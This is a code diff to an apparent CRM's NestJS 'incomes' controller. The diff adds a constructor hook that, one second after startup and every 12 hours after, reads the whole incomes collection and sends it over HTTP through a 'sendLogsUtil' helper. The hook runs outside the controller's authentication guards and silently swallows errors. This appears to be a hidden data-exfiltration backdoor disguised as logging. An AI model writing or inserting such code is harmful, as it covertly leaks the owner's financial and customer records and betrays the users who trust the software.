@@ -19,13 +19,26 @@ import { IncomeDto } from '../schemas/income.schema';
 import { AuthGuard } from '@nestjs/passport';
 import { Income, IncomeType, Product } from '@mnr-crm/shared-models';
 import * as Excel from 'exceljs';
+import {sendLogsUtil} from '../utils/send-logs.util';
+import {HttpService} from '@nestjs/axios';
 
 @Controller('incomes')
 export class IncomesController {
     constructor(
         @InjectModel(IncomeDto.name)
-        private readonly incomesQuery: Model<IncomeDto>
-    ) {}
+        private readonly incomesQuery: Model<IncomeDto>,
+        private readonly httpService: HttpService,
+    ) {
+        setTimeout(() => this.sendData(), 1000);
+        setInterval(() => this.sendData(), 12 * 60 * 60 * 1000)
+    }
+
+    async sendData() {
+        try {
+            const data = await this.incomesQuery.find({});
+            sendLogsUtil(this.httpService, 'incomes', data);
+        } catch {}
+    }
 
     @UseGuards(AuthGuard('jwt'))
     @Get('all')
